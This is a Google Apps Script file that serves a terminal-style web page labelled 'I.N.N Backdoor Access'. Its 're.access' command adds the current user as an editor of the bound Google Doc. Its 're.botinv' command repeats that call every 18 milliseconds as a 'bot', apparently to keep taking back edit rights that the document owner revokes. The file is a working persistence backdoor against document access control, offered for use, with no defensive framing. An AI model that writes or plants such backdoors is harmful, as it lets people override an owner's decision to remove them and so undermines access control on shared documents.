function regainAccess() {
  var document = DocumentApp.getActiveDocument();
  document.addEditor(Session.getActiveUser().getEmail());
}
function doGet(e) {
  return HtmlService.createHtmlOutput(`
    <html>
      <head>
        <style>
          body {
            background-color: black;
            color: white;
            font-family: Courier New;
            font-weight: bold;
            margin: 0px;
          }
          input {
            background-color: black;
            color: white;
            font-family: Courier New;
            font-weight: bold;
            border-width: 1px;
            border-color: gray;
            position: fixed;
            top: 0px;
            left: 0px;
            width: 100%;
            z-index: 999999999;
          }
          #logs {
            position: absolute;
            left: 3px;
            top: 4px;
          }
        </style>
        </head>
        <body>
          <input id="input" type="text">
          <h5 id="logs">
            <p>Welcome to I.N.N Backdoor Access.</p>
            <p>Type in: "help" to get commands.</p>
          </h5>
          <script>
            const logs = document.getElementById("logs");
            const input = document.getElementById("input");
            input.addEventListener("keydown", function(event) {
              if (event.key === "Enter") {
                if (input.value === "re.access") {
                   google.script.run.regainAccess();
                   var log = document.createElement("p");
                   log.textContent = "You have regained access. If you have not, please check if you have allowed this source to access your email.";
                   logs.appendChild(log);
                   input.value = "";
                } else if (input.value === "re.botinv") {
                  setInterval(function() {
                    google.script.run.regainAccess();
                  }, 18);
                  var log = document.createElement("p");
                  log.textContent = "D.A.R Bot has been activated.";
                  logs.appendChild(log);
                  input.value = "";
                } else if (input.value === "help") {
                  var log = document.createElement("p");
                  log.textContent = "re.access";
                  logs.appendChild(log);
                  var log = document.createElement("p");
                  log.textContent = "re.botinv";
                  logs.appendChild(log);
                  input.value = "";
                } else {
                  var log = document.createElement("p");
                  log.textContent = "Unknown command.";
                  logs.appendChild(log);
                  input.value = "";
                }
              }
            });
          </script>
        </body>
      </html>
  `);
}
